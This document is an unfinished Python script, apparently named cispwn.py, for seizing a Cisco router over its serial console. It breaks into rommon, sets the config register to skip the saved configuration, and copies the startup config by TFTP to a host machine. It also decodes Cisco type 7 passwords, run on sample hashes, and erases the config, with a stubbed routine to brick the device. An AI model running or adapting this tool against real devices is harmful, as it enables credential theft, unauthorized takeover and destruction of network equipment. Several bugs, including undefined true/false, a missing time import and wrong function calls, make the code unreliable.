#!/usr/bin/python

import serial
import sys
import getopt

version = 'Version 0.1'
tftp = 0
copied = 0

#ser = serial.Serial('/dev/ttyUSB0') # open serial port
#print (ser.name) # check which port was really used
#ser.close() # close
#test
#Upon power cycling, loops the command until the router boots with a blank config. It then enables higher priviledges for further commands to be run.
def rommon(console):
	rom = false
	while rom == false:
		prompt = read_serial(console)
		#Checks if the config has already been loaded
		if "Press RETURN" in prompt:
			print "Power cycle the router again. This script will wait for 10 seconds and loop again."
			time.sleep(10)
		#Sends the Ctrl+C to stop the boot and enter rommon
		elif "Self decompressing the image" in prompt:
			send_command(console,'\x03')
			rom = true
			print "rommon is ready"
		#Boots the router in recovery mode
			send_command(console,'confreg 2042')
			send_command(console,'boot')
			print "Booting"
			time.sleep(20)
			send_command(console,'no')
			send_command(console,'')
			send_command(console,'enable')

#sets IP settings of the router's interface
def tftp_setup(console):
	send_command(console,'config t')
	send_command(console,'do show ip int brief')
	prompt = read_serial(console)
	#Checks whether a Gigabit interface is available, if not, it defaults to the first FastEthernet interface.
	print "Setting interface options"
	if "GigabitEthernet0/0" in prompt:
		send_command(console,'interface Gig0/0')
	else:
		send_command(console,'interface Fa0/0')
	send_command(console,'no shut')
	send_command(console,'ip addr 192.168.1.1 255.255.255.0')
	send_command(console,'\x03')
	send_command(console,'')
	print "Interface options set"
	tftp = 1


def copy_config(console):
	#tftp the config file to the host machine for further commands
	if tftp == 0:
		tftp_setup(console)
	send_command(console,'copy startup-config tftp:')
	send_command(console,'192.168.1.2')
	send_command(console,'cispwn-config')
	copied = 1

def crack_password(password):
	plaintext = ''
	xlat = "dsfd;kfoA,.iyewrkldJKDHSUBsgvca69834ncxv9873254k;fg87"
	i = 2
	val = 0
	seed = (ord(password[0]) - 0x30) * 10 + ord(password[1]) - 0x30
	while i < len(password):
		if (i != 2 and not(i & 1)):
			plaintext += chr(val ^ ord(xlat[seed]))
			seed += 1
			seed %= len(xlat)
			val = 0
		val *= 16
		c=password[i]
		if(c.isdigit()):
			val += ord(password[i]) - 0x30
		if(ord(password[i]) >= 0x41 and ord(password[i]) <= 0x46):
			val += ord(password[i]) - 0x41 + 0x0a
		i += 1
	plaintext += chr(val ^ ord(xlat[seed]))
	return plaintext




def decrypt_passwords(console):
	if copied == 0:
		copy_config() 
		#and parse the file for cisco 7 passwords, then crack them and display them in plaintext


def randomize_passwords(console):
	if copied == 0:
		copy_config()
		#parse the file for passwords, replace them with random encrypted passwords


def delete_config(console):
	#delete the startup config file
	send_command(console,'erase startup-config')
	send_command(console,'')
	print "config was deleted"

#def brick_router(console):
	#deletes every system image on the router, requires external image to get it working again.

def read_serial(console):
	#Checks to see if there are bytes waiting to be read, and reads them. If no bytes are found, it returns a null string.
	data_bytes = console.inWaiting()
	if data_bytes:
		return console.read(data_bytes)
	else:
		return ""
#might remove reading portion for less output to screen
def send_command(console,cmd=''):
	#Sends a command to the router and returns the bytes in waiting as output.
	console.write(cmd+'\r\n')
	time.sleep(1)
	return read_serial(console)

def main(argv):
	try:
		opts, args = getopt.getopt(argv, "hV", ['help',
												'version'])
	except getopt.GetoptError:
		print 'Usage: ./cispwn.py <args>'
		sys.exit(2)
	for opt, arg in opts:
		if opt in ('-h', '--help'):
			print 'Usage: ./cispwn.py\n'
			print 'Arguments:'
			print '\t-V or --version\t\tShow version info'
			print '\t-h or --help\t\tShow this screen'
			sys.exit()
		if opt in ('-V', '--version'):
			print 'cispwn.py ' + version
			sys.exit()
	print 'Yay!'
	print crack_password("0835495D1D")
	print crack_password("0822455D0A16")
	print crack_password("08204E4D0D1C03101A02060F26262A2723243000130315164E40")
	print crack_password("0835495D1D100B1043595F")
	#console=serial.Serial(
		#	port = 'COM1',
		#	baudrate = 9600,
		#	parity = "N"
		#	stopbit = 1,
		#	bytesize = 8
		#	timeout = READ_TIMEOUT
		#)
	#if not console.isOpen():
		#print 'Error, a connection could not be made'
		#sys.exit()
	#Function for entering rommon goes here

if __name__ == "__main__":
	main(sys.argv[1:])
	


